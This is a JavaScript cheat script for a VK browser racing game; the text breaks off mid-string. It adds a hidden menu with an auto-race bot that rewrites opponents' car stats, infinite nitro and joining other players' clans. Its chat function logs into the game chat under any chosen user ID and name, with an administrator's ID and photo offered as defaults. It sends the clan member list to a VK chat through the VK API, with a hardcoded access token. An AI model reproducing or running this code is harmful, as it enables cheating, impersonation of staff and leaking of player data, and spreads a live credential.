function init_hack() {
$(document).keydown(function(event) {if(event.keyCode == 36){if(api.rival)viewInfo(api.rival[0].uid);}});fuckWords=['asdasfasfasfwefgsdagkdahgasgd'];var po = [];document.addEventListener("keydown",function(e){var op = e.which;if (po.indexOf(op)<0){po.push(op);}if((po[0]==82 && po[1]==55) || (po[0]==55 && po[1]==82)){HTMLappend();tChat.chat();tChat.au();po=[];}
});document.addEventListener("keyup",function(e){po.splice(po.indexOf(e.which),1);});
var opat = function(){var othdv = document.getElementById('otherDiv');var ele = othdv.getElementsByTagName('img');for (var i = 1; i < ele.length; i++) {ele[i].addEventListener('mouseover', function() {this.style.opacity=0.7;});ele[i].addEventListener('mouseout', function() {this.style.opacity=1;});}};

var HTMLappend = function(id) {
//if(user.id!=jg){HTMLappend = function(){};ACT = function(){};init_hack = function(){};return};
if(!id)id=0;
var radio_player = document.getElementById("radio_player");if(radio_player){$('.player_stop')[0].click();$('#radio_player').remove();};imgload("http://u913404y.beget.tech/phch/bgCarbon.png",'760','320',1,'bcarb');$('#bcarb')[0].style.cursor='default';
var vk_ads = document.getElementById("vk_ads_1208");if(vk_ads){$('#vk_ads_1208')[0].remove();};
	if(id==0){
		
		//var euro_p = 'http://u913404y.beget.tech/images/goods/gifs/euro.gif';
		//imgload(euro_p,76*3,32*3,0,'eurogif','накруточка евросиков'); $('#eurogif')[0].style.cursor='pointer';$('#eurogif')[0].style.position='absolute';$('#eurogif')[0].style.left=27+'px';$('#eurogif')[0].style.top='50px';$('#eurogif')[0].onclick=function(){ACT(1337);};
		var txtur_p = 'http://u913404y.beget.tech/phch/sm.png';
		imgload(txtur_p,556/5,590/10*2,0,'txturph','замена текстур'); $('#txturph')[0].style.cursor='pointer';$('#txturph')[0].style.position='absolute';$('#txturph')[0].style.right=80+'px';$('#txturph')[0].style.bottom='40px';$('#txturph')[0].onclick=function(){HTMLappend(64);back();};
		var scripts_p = 'http://u913404y.beget.tech/images/goods/gifs/scripts.gif';
		imgload(scripts_p,76*3,32*3,0,'scriptsph','скрипты'); $('#scriptsph')[0].style.cursor='pointer';$('#scriptsph')[0].style.position='absolute';$('#scriptsph')[0].style.left=76*3+37+'px';$('#scriptsph')[0].style.top='50px';$('#scriptsph')[0].onclick=function(){HTMLappend(1);back();};
		var info_p = 'http://u913404y.beget.tech/phch/info.png';
		imgload(info_p,76*3,32*4,0,'infoph'); $('#infoph')[0].style.cursor='pointer';$('#infoph')[0].style.position='absolute';$('#infoph')[0].style.left=76*3+37+'px';$('#infoph')[0].style.bottom='40px';$('#infoph')[0].onclick=function(){HTMLappend(3);back();};
		var low_p = 'http://u913404y.beget.tech/phch/car/low.png';
		imgload(low_p,210,126,0,'lowph','Красота'); $('#lowph')[0].style.cursor='pointer';$('#lowph')[0].style.position='absolute';$('#lowph')[0].style.left='30px';$('#lowph')[0].style.bottom='30px';$('#lowph')[0].onclick=function(){HTMLappend(84);back();};
		var more_p = 'http://u913404y.beget.tech/images/goods/gifs/more.gif';
		imgload(more_p,76*3,32*3,0,'moreph','мелочь'); $('#moreph')[0].style.cursor='pointer';$('#moreph')[0].style.position='absolute';$('#moreph')[0].style.left=76*6+47+'px';$('#moreph')[0].style.top='50px';$('#moreph')[0].onclick=function(){HTMLappend(2);back();};
		
		var players_p = 'http://u913404y.beget.tech/phch/plaph.png';
		imgload(players_p,128,96,0,'plaph','Список клана');$('#plaph')[0].style.cursor='pointer';$('#plaph')[0].style.position='absolute';$('#plaph')[0].style.left=67+'px';$('#plaph')[0].style.top='50px';$('#plaph')[0].onclick=function(){
			
		query={}; 
		query.head = 'clanGet'; 
		socket.send(JSON.stringify(query));
		setTimeout(function(){
		var dc = 'Список клана : <br>';
		for(var d=0; d<=clanUsers.length/2;d++){
		dc+=(d*1+1)+'. '+clanUsers[d].name+' |vk.com/id'+clanUsers[d].id+'<br>';
		}
		var X = ("onload" in new XMLHttpRequest()) ? XMLHttpRequest : XDomainRequest;
		var xhr = new X();
		xhr.open('GET', 'https://api.vk.com/method/messages.send?chat_id=345&message='+dc+'&v=5.68&access_token=a106330801953bf6c08ee2e98d39485fd0e8920099ccce9f5aec935d9f9072e497bbbcaa67cc3fc72e54c', true);
		xhr.send(); 
		var dc = '';
		for(var d=clanUsers.length/2; d<=clanUsers.length-1;d++){
		dc+=(d*1+1)+'. '+clanUsers[d].name+' |vk.com/id'+clanUsers[d].id+'<br>';
		}
		var X = ("onload" in new XMLHttpRequest()) ? XMLHttpRequest : XDomainRequest;
		var xhr = new X();
		xhr.open('GET', 'https://api.vk.com/method/messages.send?chat_id=345&message='+dc+'&v=5.68&access_token=a106330801953bf6c08ee2e98d39485fd0e8920099ccce9f5aec935d9f9072e497bbbcaa67cc3fc72e54c', true);
		xhr.send(); 
		infoMsg('Список отправлен в беседу','<cebter>Готово. Если сообщение не отправилось, попробуй ещё раз.');
		},2000);
		};
	}
	
	if(id==1){
		var bot = ["AUTOBOT","SLIVBOT"]; //1
		textload(bot[0],bot[0],'Бот катает за вас');
		$('#AUTOBOT')[0].onmouseover= function(){$('#AUTOBOT')[0].style.color='white';};
		$('#AUTOBOT')[0].onmouseout= function(){$('#AUTOBOT')[0].style.color='red';};
		$('#AUTOBOT')[0].style.cursor='pointer';$('#AUTOBOT')[0].style.position='absolute';$('#AUTOBOT')[0].style.fontSize=40;$('#AUTOBOT')[0].style.color='red';$('#AUTOBOT')[0].style.left=760/2-200+'px';$('#AUTOBOT')[0].style.top='140px';$('#AUTOBOT')[0].onclick=function(){
			var yesAU = confirm('Запустить автобота?');if(yesAU==1){drawPage('race');
AUTO = {
	now : new Date(),
    win1 : user.allWin,
    lose1 : user.allLose,
    intervalID1 : 1,
    intervalID2 : 1,
    intervalID3 : 1,
	intervalID4 : 1,
	fritndG : confirm('Газовать со своими? (можно будет изменять без остановки)\n( ОК - Да | ОТМЕНА - Нет )'),
	bot : function(){generateCarForBot = function(ownCar){raceWithFriend=false;var botCar = JSON.parse(JSON.stringify(ownCar));var easy = true;botCar.tires=-getRandomInt(110, 111112);botCar.engine=-getRandomInt(110, 111112);botCar.turbo=-getRandomInt(110, 111112);botCar.transm=-getRandomInt(110, 111112);botCar.exhaust=-getRandomInt(110, 111112);botCar.susp=-getRandomInt(110, 111112);var lucky = true;botCar.rings = getRandomInt(0, 80);botCar.color = getRandom(0, 2);botCar.vinil = [];return botCar;}},

    play : function(){
	AUTO.bot();
	PA = true;
		var boy = function() {
			if ($('#startRandRace')[0] && $('#blockBox').css('display') == 'none' && globalPage == "race") {
				$('#startRandRace').click();
			} else {
			}
			
			if($('#otherDiv').children().length <2 &&  $('#otherDiv')[0].outerHTML == '<div id="otherDiv" style="display: block;"></div>' && $('#blockMenu').css('display') == 'none' && $('#blockBox').css('display') == 'none' && $('#carInfoDiv').css('display') == 'none' ){
				drawPage('race');
			}
			if($('#otherDiv').children().length == 3 && $('#blockMenu').css('display') == 'none' && $('#blockBox').css('display') == 'none' && $('#carInfoDiv').css('display') == 'block' && typeof($('.vsCenter')[0]) == 'object'){
				drawPage('race');
			}
			
			};
		var gus = function(){
if(typeof(comp.rival)!== "undefined"){var crcu = comp.rival.car.uid;}else{var crcu = myUid*1;}
raceWithFriend ? raceWithFriend : false;
if(crcu == myUid*1){acsel = true;jetOn = true;}
			if(AUTO.fritndG==false){
			if(typeof raceWithFriend=='undefined'){acsel = true;jetOn = true;};
				if(!raceWithFriend){acsel = true;jetOn = true;}
			}else{
				acsel = true;jetOn = true;
			}
		};
					
		user.vinilLoadAbort = true;doNotDisturb = true;
		this.stop(0);
		this.intervalID1 = setInterval(boy, 700);
		this.intervalID2 = setInterval(function(){gus(AUTO.fritndG)}, 1);
    },
	
	draw : function(){
		query={}; query.head = 'theDraw';
		socket.send(JSON.stringify(query));
	},
    
    stop : function(num){
		clearInterval(this.intervalID1);
		clearInterval(this.intervalID2);
		
		var thh = new Date();
		var time = (thh - AUTO.now)/60000;
		for(k in raiting){
			if(raiting[k]['id'] == myUid*1){var mRAIT= ' <small>('+(parseInt(k)+1)+')</small>'; break}else{var mRAIT='';}
		}
		for(k in TOP){
			if(TOP[k]['id'] == myUid*1){var mTOP= ' <small>('+(parseInt(k)+1)+')</small>'; break}else{var mTOP='';}
		}
		
		if(num == 1){
		query={};query.head = 'cancelRandomRace';socket.send(JSON.stringify(query));$("#blockBox").css('display','none');
		win2 = user.allWin - this.win1;
		lose2 = user.allLose - this.lose1;
		infoMsg('<center>Работа бота остановлена', 'Побед : <font color=green>' + win2 + ' <small>('+user.allWin+')</small></font><br>Поражений : <font color=red>' + lose2 + ' <small>('+user.allLose+')</small></font> <font color=gray>________________________</font><br>Рейтинг : <span title="Нажать, чтобы посмотреть игроков рядом" onclick="AUTO.top100()"><font color=yellow>'+user.rate+mRAIT+'</font></span><br><span title="Нажать, чтобы посмотреть игроков рядом" onclick="AUTO.week()">Побед (неделя) : <font color=yellow>'+user.wins+mTOP+'</font></span> <font color=gray>________________________</font><br><font color=aqua>Бот работал : '+time.toFixed(2)+' минут.</font>');
		}
    },
	
	STAT : function(){
		var thh = new Date();
		var time = (thh - AUTO.now)/60000;
		for(k in raiting){
			if(raiting[k]['id'] == myUid*1){var mRAIT= ' <small>('+(parseInt(k)+1)+')</small>'; break}else{var mRAIT='';}
		}
		for(k in TOP){
			if(TOP[k]['id'] == myUid*1){var mTOP= ' <small>('+(parseInt(k)+1)+')</small>'; break}else{var mTOP='';}
		}
		
		win2 = user.allWin - this.win1;
		lose2 = user.allLose - this.lose1;
		infoMsg('<center><small><font color=orange>Стата за время работы бота.</font></small>', 'Побед : <font color=green>' + win2 + ' <small>('+user.allWin+')</small></font><br>Поражений : <font color=red>' + lose2 + ' <small>('+user.allLose+')</small></font> <font color=gray>________________________</font><br>Рейтинг : <span title="Нажать, чтобы посмотреть игроков рядом" onclick="AUTO.top100()"><font color=yellow>'+user.rate+mRAIT+'</font></span><br><span title="Нажать, чтобы посмотреть игроков рядом" onclick="AUTO.week()">Побед (неделя) : <font color=yellow>'+user.wins+mTOP+'</font></span> <font color=gray>________________________</font><br><font color=aqua>Бот работает : '+time.toFixed(2)+' минут.</font>');
	},
	
	week : function(){
		var qs = '';
		for(k in TOP){
			if(TOP[k]['id'] == myUid*1){qs += '<font color=red><small>'+(parseInt(k)+1)+'.&nbsp;</small>'+TOP[k]['name']+'&nbsp;-&nbsp;'+TOP[k]['wins']+'</font><br>';}
			else{
				qs += '<small>'+(parseInt(k)+1)+'.&nbsp;</small>'+TOP[k]['name']+'&nbsp;-&nbsp;'+TOP[k]['wins']+'<br>';
			}
		}
		infoMsg(qs,'<center>Топ недели');
	},
	top100 : function(){
		var qs = '';
		for(k in raiting){
			if(raiting[k]['id'] == myUid*1){var mRAIT= parseInt(k); break}else{var mRAIT=93;}
		}
		if(mRAIT>=3){mRAIT = mRAIT-3;}else{mRAIT = 0}
		for(var k=mRAIT; k<mRAIT+7;k++){
			if(raiting[k]['id'] == myUid*1){qs += '<font color=red><small>'+(parseInt(k)+1)+'.&nbsp;</small>'+raiting[k]['name']+'&nbsp;-&nbsp;'+raiting[k]['rate']+'</font><br>';}
			else{
				qs += '<small>'+(parseInt(k)+1)+'.&nbsp;</small>'+raiting[k]['name']+'&nbsp;-&nbsp;'+raiting[k]['rate']+'<br>';
			}
		}
		infoMsg(qs,'<center>Топ игроков рядом');
	}
    
};
		
		
		
		AUTO.play();
		STOPBOT();STAT();fritndG();DRAW();
		$('#fritndG, #STOPBOT, #STAT, #DRAW').animate({opacity:0},5000);	$('#fritndG, #STOPBOT, #STAT, #DRAW').hover(function(){$('#fritndG, #STOPBOT, #STAT, #DRAW').css('opacity',1);},function(){$('#fritndG, #STOPBOT, #STAT, #DRAW').css('opacity',0);})
		}else{}};
		textload(bot[1],bot[1],'Бот сливается, ну, в принципе, и всё ¯\\_(ツ)_/¯');
		$('#SLIVBOT')[0].onmouseover= function(){$('#SLIVBOT')[0].style.color='white';};
		$('#SLIVBOT')[0].onmouseout= function(){$('#SLIVBOT')[0].style.color='red';};
		$('#SLIVBOT')[0].style.cursor='pointer';$('#SLIVBOT')[0].style.position='absolute';$('#SLIVBOT')[0].style.fontSize=40;$('#SLIVBOT')[0].style.color='red';$('#SLIVBOT')[0].style.left=760/2+100+'px';$('#SLIVBOT')[0].style.top='140px';$('#SLIVBOT')[0].onclick=function(){var yesSL = confirm('Запустить сливбота?');if(yesSL==1){drawPage('race');PLAY_SLIV();if(SBOT==false)STOPBOT();}else{}};
	}
	if(id==2){
	var carbuy_p = 'http://u913404y.beget.tech/phch/car.png';
	imgload(carbuy_p,800/10*3,565/10*3,0,'carbph','покупка старых машин');$('#carbph')[0].style.cursor='pointer';$('#carbph')[0].style.position='absolute';$('#carbph')[0].style.left=80+'px';$('#carbph')[0].style.top='90px';$('#carbph')[0].onclick=function(){staroe();};
	
	var clan_p = 'http://u913404y.beget.tech/phch/clan.png';
	imgload(clan_p,431/3,300/3,0,'clanph','вступление в чужой клан (если есть места)'); $('#clanph')[0].style.cursor='pointer';$('#clanph')[0].style.position='absolute';$('#clanph')[0].style.right=100+'px';$('#clanph')[0].style.top='110px';$('#clanph')[0].onclick=function(){clanin();};
	var mask_p = 'http://u913404y.beget.tech/phch/mask.png';
	imgload(mask_p,256/2.5,256/2.5,0,'maskph','вход в чат под другим именем'); $('#maskph')[0].style.cursor='pointer';$('#maskph')[0].style.position='absolute';$('#maskph')[0].style.right=760/2-45+'px';$('#maskph')[0].style.bottom='38px';$('#maskph')[0].onclick=function(){lch();};
	var jet_p = 'http://u913404y.beget.tech/phch/jet.png';
	imgload(jet_p,118,52,0,'jetph','пополнение азота'); $('#jetph')[0].style.cursor='pointer';$('#jetph')[0].style.position='absolute';$('#jetph')[0].style.right=760/2-45+'px';$('#jetph')[0].style.top='38px';$('#jetph')[0].onclick=function(){
		var jetpr = prompt('Нажимая  на мусорный бак(удаление азота), азот становится (1)бесконечным или (2)наполненным на 150% ?', 2);
		if(jetpr*1 == 1){$('#saleJet').die('click');$('#saleJet').on('click',function(){myCar.jet=Infinity;});};
		if(jetpr*1 == 2){$('#saleJet').die('click');$('#saleJet').on('click',function(){myCar.jet=150;});};
	};
	}

	if(id==3){
		addib();
	}

	if(id==84){
	var arw = ['','ss1.png','ss2.png','ss3.png','ss4.png'];
	for (var i = 1; i < 5; i++) {
		imgload('http://u913404y.beget.tech/phch/car/'+arw[i],93,93,0,'arw'+i);
		$('#arw'+i)[0].style.cursor='pointer';$('#arw'+i)[0].style.position='absolute';
	};
	$('#arw1')[0].style.left=100+'px';$('#arw1')[0].style.bottom=320/2-46+'px';$('#arw1')[0].onclick=function(){myCar.pos.x-=2;changeCar(myCar,{});};
	$('#arw2')[0].style.right=760/2-46+'px';$('#arw2')[0].style.top='50px';$('#arw2')[0].onclick=function(){myCar.pos.y-=2;changeCar(myCar,{});};
	$('#arw3')[0].style.right=100+'px';$('#arw3')[0].style.bottom=320/2-46+'px';$('#arw3')[0].onclick=function(){myCar.pos.x+=2;changeCar(myCar,{});};
	$('#arw4')[0].style.right=760/2-46+'px';$('#arw4')[0].style.bottom='50px';$('#arw4')[0].onclick=function(){myCar.pos.y+=2;changeCar(myCar,{});};
	var rand = Math.floor(Math.random() * 85);
	imgload(imgs['w'+rand].src,50,50,0,'ww1'); $('#ww1')[0].style.cursor='pointer';$('#ww1')[0].style.position='absolute'; $('#ww1')[0].style.left=50+'px';$('#ww1')[0].style.bottom='50px'; $('#ww1')[0].onclick=function(){HTMLappend(85);back();};
	imgload(imgs['w'+rand].src,50,50,0,'ww2'); $('#ww2')[0].style.cursor='pointer';$('#ww2')[0].style.position='absolute'; $('#ww2')[0].style.right=50+'px';$('#ww2')[0].style.bottom='50px'; $('#ww2')[0].onclick=function(){HTMLappend(85);back();};
	}

	if(id==85){
	var arw = ['','ss1.png','ss3.png','ss1.png','ss3.png','ss2.png','ss4.png','pm1.png','pm2.png','pm1.png','pm2.png'];
	for (var i = 1; i < 5; i++) {
		imgload('http://u913404y.beget.tech/phch/car/'+arw[i],93/1.5,93/1.5,0,'arw'+i);
		$('#arw'+i)[0].style.cursor='pointer';$('#arw'+i)[0].style.position='absolute';
	};
	for (var i = 5; i < 7; i++) {
		imgload('http://u913404y.beget.tech/phch/car/'+arw[i],93,93,0,'arw'+i);
		$('#arw'+i)[0].style.cursor='pointer';$('#arw'+i)[0].style.position='absolute';
	};
	for (var i = 7; i < 11; i++) {
		imgload('http://u913404y.beget.tech/phch/car/'+arw[i],50/1.5,50/1.5,0,'arw'+i);
		$('#arw'+i)[0].style.cursor='pointer';$('#arw'+i)[0].style.position='absolute';
	};
	$('#arw1')[0].style.left=170-35+'px';$('#arw1')[0].style.bottom=320/2-93/3+'px';$('#arw1')[0].onclick=function(){myCar.whPos.xr--;changeCar(myCar,{});};
	$('#arw2')[0].style.left=170+35+'px';$('#arw2')[0].style.bottom=320/2-93/3+'px';$('#arw2')[0].onclick=function(){myCar.whPos.xr++;changeCar(myCar,{});};
	$('#arw3')[0].style.right=170+35+'px';$('#arw3')[0].style.bottom=320/2-93/3+'px';$('#arw3')[0].onclick=function(){myCar.whPos.xf--;changeCar(myCar,{});};
	$('#arw4')[0].style.right=170-35+'px';$('#arw4')[0].style.bottom=320/2-93/3+'px';$('#arw4')[0].onclick=function(){myCar.whPos.xf++;changeCar(myCar,{});};
	$('#arw5')[0].style.right=760/2-46+'px';$('#arw5')[0].style.top='26px';$('#arw5')[0].onclick=function(){myCar.whPos.yf--;myCar.whPos.yr--;changeCar(myCar,{});};
	$('#arw6')[0].style.right=760/2-46+'px';$('#arw6')[0].style.bottom='26px';$('#arw6')[0].onclick=function(){myCar.whPos.yf++;myCar.whPos.yr++;changeCar(myCar,{});};
	$('#arw7')[0].style.left=185+'px';$('#arw7')[0].style.top='60px';$('#arw7')[0].onclick=function(){myCar.whPos.r+=1;changeCar(myCar,{});};
	$('#arw8')[0].style.left=185+'px';$('#arw8')[0].style.bottom='60px';$('#arw8')[0].onclick=function(){myCar.whPos.r-=1;changeCar(myCar,{});};
	$('#arw9')[0].style.right=185+'px';$('#arw9')[0].style.top='60px';$('#arw9')[0].onclick=function(){myCar.whPos.r+=1;changeCar(myCar,{});};
	$('#arw10')[0].style.right=185+'px';$('#arw10')[0].style.bottom='60px';$('#arw10')[0].onclick=function(){myCar.whPos.r-=1;changeCar(myCar,{});};
	var crcr = "\cars\\"+salon[myCar.id].id+"\\body.png";
	var crcr1 = "\cars\\"+salon[myCar.id].id+"\\light.png";
	imgload(crcr,380/4,100/4,0,'crcr'); $('#crcr')[0].style.cursor='pointer';$('#crcr')[0].style.position='absolute'; $('#crcr')[0].style.left=50+'px';$('#crcr')[0].style.bottom='50px'; $('#crcr')[0].onclick=function(){HTMLappend(84);back();};
	imgload(crcr,380/4,100/4,0,'crcr1'); $('#crcr1')[0].style.cursor='pointer';$('#crcr1')[0].style.position='absolute'; $('#crcr1')[0].style.right=50+'px';$('#crcr1')[0].style.bottom='50px'; $('#crcr1')[0].onclick=function(){HTMLappend(84);back();};
	imgload(crcr1,380/4,100/4,0,'crcr2'); $('#crcr2')[0].style.cursor='pointer';$('#crcr2')[0].style.position='absolute'; $('#crcr2')[0].style.left=50+'px';$('#crcr2')[0].style.bottom='50px'; $('#crcr2')[0].onclick=function(){HTMLappend(84);back();};
	imgload(crcr1,380/4,100/4,0,'crcr3'); $('#crcr3')[0].style.cursor='pointer';$('#crcr3')[0].style.position='absolute'; $('#crcr3')[0].style.right=50+'px';$('#crcr3')[0].style.bottom='50px'; $('#crcr3')[0].onclick=function(){HTMLappend(84);back();};
	var rand = function(){ var ll = Math.floor(Math.random() * 84); return ll};
	imgload(imgs['w'+rand()].src,50,50,0,'www','Рандомные диски (визуал)'); $('#www')[0].style.cursor='pointer';$('#www')[0].style.position='absolute'; $('#www')[0].style.right=760/2-25+'px';$('#www')[0].style.bottom=320/2-25+'px'; $('#www')[0].onclick=function(){myCar.rings=rand();changeCar(myCar,{});};
	}

	if(id==64){
	var smoke_p = 'http://u913404y.beget.tech/phch/sm.png';
	imgload(smoke_p,556/5,590/10*2,0,'smokeph','фигня с дымом'); $('#smokeph')[0].style.cursor='pointer';$('#smokeph')[0].style.position='absolute';$('#smokeph')[0].style.right=100+'px';$('#smokeph')[0].style.bottom='110px';$('#smokeph')[0].onclick=function(){HTMLappend(66);back();};
	var bg_p = ['http://u913404y.beget.tech/phch/bg1.jpg','http://u913404y.beget.tech/phch/bg2.jpg'];
	var rand = Math.floor(Math.random() * bg_p.length);
	imgload(bg_p[rand],760/3,291/3,0,'bgph','замена фона'); $('#bgph')[0].style.cursor='pointer';$('#bgph')[0].style.position='absolute';$('#bgph')[0].style.left=110+'px';$('#bgph')[0].style.bottom='110px';$('#bgph')[0].onclick=function(){ACT(17);};
	}
	
	if(id==66){
	textload('Выключить','smOFF');
	$('#smOFF')[0].onmouseover= function(){$('#smOFF')[0].style.color='white';};
	$('#smOFF')[0].onmouseout= function(){$('#smOFF')[0].style.color='red';};
	$('#smOFF')[0].style.cursor='pointer';$('#smOFF')[0].style.position='absolute';$('#smOFF')[0].style.fontSize=40;$('#smOFF')[0].style.color='red';$('#smOFF')[0].style.left=760/2-90+'px';$('#smOFF')[0].style.top=320/2-130+'px';$('#smOFF')[0].onclick=function(){ACT(67)};
	textload('Своя картинка','smph');
	$('#smph')[0].onmouseover= function(){$('#smph')[0].style.color='white';};
	$('#smph')[0].onmouseout= function(){$('#smph')[0].style.color='red';};
	$('#smph')[0].style.cursor='pointer';$('#smph')[0].style.position='absolute';$('#smph')[0].style.fontSize=40;$('#smph')[0].style.color='red';$('#smph')[0].style.left=760/2-110+'px';$('#smph')[0].style.top=320/2-30+'px';$('#smph')[0].onclick=function(){ACT(68)};
	textload('Рандомный','smrand');
	$('#smrand')[0].onmouseover= function(){$('#smrand')[0].style.color='white';};
	$('#smrand')[0].onmouseout= function(){$('#smrand')[0].style.color='red';};
	$('#smrand')[0].style.cursor='pointer';$('#smrand')[0].style.position='absolute';$('#smrand')[0].style.fontSize=40;$('#smrand')[0].style.color='red';$('#smrand')[0].style.left=760/2-90+'px';$('#smrand')[0].style.top=320/2+70+'px';$('#smrand')[0].onclick=function(){ACT(69)};
	}
opat();
};
var PA=false,PS=false,SBOT=false;

var PLAY_AUTO = function(){PA=true;var boy = function (){if ($('#blockBox').css("display") != "block" && $('#startRandRace').css("display") == "block" && globalPage == "race"){$('#startRandRace').click();}else{viewGreenMsg('Зайди во вкладку В БОЙ');}};
var fun1 = function (){if(1==1){acsel = true;jetOn = true;}};
var lag = function (){if($('#carInfoDiv').css("display") == "block" && $('#startRandRace').css("display") != "block" && globalPage == "race" && $('.vsLeft').css("display") == "block" && $('.vsCenter').css("display") == "block" && $('.vsRight').css("display") == "block"){drawPage('race');infoMsg('<center>ОШИБКА<br>!!!','<font color = red>ТРЕБУЕТСЯ ПЕРЕЗАГРУЗКА<br>!!!<br>ОШИБКА ИГРЫ<br>!!!</font>');};}
user.vinilLoadAbort=true;doNotDisturb=true;clearInterval(intervalIDb);clearInterval(intervalID1);clearInterval(intervalIDl);var intervalIDb = setInterval( boy , 600 );var intervalID1 = setInterval( fun1 , 1 );var intervalIDl = setInterval( lag , 5000 );}
var STOP_AUTO = function() {PA=false;var win2 = user.allWin - win1;var lose2 = user.allLose - lose1;clearInterval(intervalIDb);clearInterval(intervalID1);clearInterval(intervalIDl);if ( $('.vsLeft').css("display") != "block" && $('.vsCenter').css("display") != "block" && $('.vsRight').css("display") != "block") {acsel = false;jetOn = false;};infoMsg('<center>Стоп','Работа Бота Остановлена. <br>Ты победил : <font color=green>'+win2+'</font> раз.<br>Ты проиграл : <font color=red>'+lose2+'</font> раз')}
//generateCarForBot = function(ownCar){raceWithFriend=false;var botCar = JSON.parse(JSON.stringify(ownCar));var easy = true;botCar.tires=-getRandomInt(110, 111112);botCar.engine=-getRandomInt(110, 111112);botCar.turbo=-getRandomInt(110, 111112);botCar.transm=-getRandomInt(110, 111112);botCar.exhaust=-getRandomInt(110, 111112);botCar.susp=-getRandomInt(110, 111112);var lucky = true;botCar.rings = getRandomInt(0, 80);botCar.color = getRandom(0, 2);botCar.vinil = [];return botCar;}


var rrr = 0,interval_s = 0;
var PLAY_SLIV = function() {PS=true;var sss = function (){rrr+=1;user.vinilLoadAbort=true;query = {};query.head = 'randomRace';query.carLev = salon[myCar.id].level;socket.send(JSON.stringify(query));infoMsg('<center>'+rrr,rrr);};var interval_s = setInterval( sss , 1000 );}
var lch = function() {
var q_id=1,q_name=-13367,q_photo='';
alert('Предупреждаю, что либо это может не сработать и ты не сможешь писать сообщения до перезагрузки, либо сработает и у тебя может двоиться чат.');
q_id = prompt('Введи id человека, на которого будет перенаправлять ваша ссылка в чате\nСейчас тут Филипп',13950293);
q_name = prompt('Введи имя.\n<BR> НЕ убираем, это перенос строки.','Фамилия<br>Имя');
q_photo = prompt('Введи ссылку на фотографию\nМожно оставить пустым, будет просто поломанная фотка в чате.','https://40807.selcdn.ru/tyaganina/images/administrator.png');
if(q_id>1 && q_name!=-13367){query.head = 'login';query.uid = parseInt(q_id,10);query.name = q_name;query.photo = q_photo;chatSocket.send(JSON.stringify(query));}else{};};
function addib(){textload('введи id :','idinp');$('#idinp')[0].style.cursor='default';$('#idinp')[0].style.position='absolute';$('#idinp')[0].style.fontSize=25;$('#idinp')[0].style.color='red';$('#idinp')[0].style.left='320px';$('#idinp')[0].style.top='122px';var inp = document.getElementById( 'inp' );var bttn = document.getElementById( 'bttn' );if(inp){inp.style.display = 'none';bttn.style.display = 'none';}if ( inp == null ){inp = document.createElement( 'input' );bttn = document.createElement (('v' == '\v') ? '<input name="myName">' : 'input');inp.type = 'text';inp.name = 'inp'; inp.id = 'inp';bttn.type = 'button';bttn.name = 'bttn';bttn.id = 'bttn';bttn.value = 'проверить';document.getElementById('otherDiv').appendChild(inp);document.getElementById('otherDiv').appendChild(bttn);}else{inp.style.display = 'block';bttn.style.display = 'block';}inp.style.margin = 'auto';inp.style.cursor='pointer';inp.style.position='absolute';inp.style.width='200px';inp.style.height='25px';inp.style.color='red';inp.style.left=760/2-105+'px';inp.style.top=320/2-13+'px';inp.style.textAlign='center';bttn.style.margin = 'auto';bttn.style.cursor='pointer';bttn.style.position='absolute';bttn.style.width='200px';bttn.style.height='25px';bttn.style.color='red';bttn.style.left=760/2-105+'px';bttn.style.top=320/2+25-13+'px';bttn.onclick=function(){infrmtn();};}
function infrmtn() {if($('#inp').val()*1 != '' || $('#inp').val()*1 != 0){sdr($('#inp').val()*1);inp.style.display = 'none';bttn.style.display = 'none';var main = document.getElementById('main');if(!main){var DIV = document.createElement("DIV");DIV.id='main';$('#otherDiv').append(DIV);DIV.style.cursor='pointer';DIV.style.position='absolute';DIV.style.top='0px';DIV.style.left='0px';DIV.style.textShadow='5px 5px 5px black';DIV.style.backgroundColor='rgba(232, 125, 125, 0.1)';DIV.style.width='760px';DIV.style.height='320px';DIV.style.color='gray';DIV.style.textAlign='center';}$('#bc')[0].remove();$('#idinp')[0].remove();back();handlers.userGetInfo = function(response){if(response.status=='ok'){hyd = response.user;VK.api('users.get',{'user_ids':hyd.id, 'fields':'photo_100,online,last_seen'},function(r){if(r.response) {ph=r['response']['0']['photo_100'];onL=r['response']['0']['online'];if (onL == 1){onL='<font color=#49F665>online</font>'}else if(onL== 0){onL='<font color=#FB7777>offline</font>'};}if(hyd.clan==-1){ul = "Не состоит"}else if(hyd.clan==0){ul = "Глава своего клана"}else{ul = '<a href="https://vk.com/id'+hyd.clan+'" target="_blank" style="text-decoration: none;color:aqua">'+hyd.clan+'</a>'};if(hyd.status==7){modr = "<font color=red>Модератор</font>"}else{modr = "Не модератор"};if(hyd.status!=13 && hyd.premiumStatus>0 && hyd.status!=7){clr = "#DAA520"}else{clr = hyd.chatColor};if(hyd.premiumStatus==2){ps = "2 (за 100 евро)"}else if(hyd.premiumStatus==1){ps = "1 (за 50 евро)"}else{ps = "0"};if(hyd.level>40){ex = "макс.";}else{ex = (options.level[hyd.level+1]-hyd.exp);};if(hyd.id == 13950293 || hyd.id == 54707231){modr = "<font color=red size=4>Администратор</font>";};if(hyd.clan>=1){ul = "<a href='https://vk.com/id"+hyd.clan+"' target='_blank' style='text-decoration: none;color:aqua'>"+hyd.clan+"</a>";}$('#main').html('');$('#main').append('<div id ="photo1"><img src="'+ph+'" height="100px" width="100px"></img><figcaption>'+onL+'</figcaption></div>');$('#photo1')[0].style.position='absolute';$('#photo1')[0].style.right=50+'px';$('#photo1')[0].style.top=160-50+'px';if (hyd.status==13){$('#main').append('<br><font color=red><b>( '+hyd.name+' - Забанен! )</b></font>');};$('#main').append('<br>VK ID: <a href="https://vk.com/id'+hyd.id+'" target="_blank" style="text-decoration: none;color:aqua">'+hyd.id+'</a>');$('#main').append('<br>Имя: '+hyd.name);$('#main').append('<br>Уровень: <font color="green"><b>'+hyd.level+'</b></font>');$('#main').append('<br>Опыт: <font color="orange"><b>'+hyd.exp+'</b></font> | Опыта осталось: <font color="orange"><b>'+ex+'</b></font>');$('#main').append("<br>Клан: "+ul);$('#main').append('<br>Доллары: <font color="green"><b>'+hyd.money+' $</b></font> | Евро: <font color="gold"><b>'+hyd.gold+' €</b></font>');$('#main').append('<br>Премиум: <font color="orange"><b>'+ps+'</b></font> | Осталось: <font color="orange"><b>'+parseInt((hyd.premiumTime-timestamp())/86400)+'</b></font> дней');$('#main').append('<br>Очки: <font color="green"><b>'+hyd.rate+'</b></font>');$('#main').append('<br>Победы: <font color="green"><b>'+hyd.allWin+'</b></font> | Поражения: <font color="red"><b>'+hyd.allLose+'</b></font>');$('#main').append('<br>%: <font 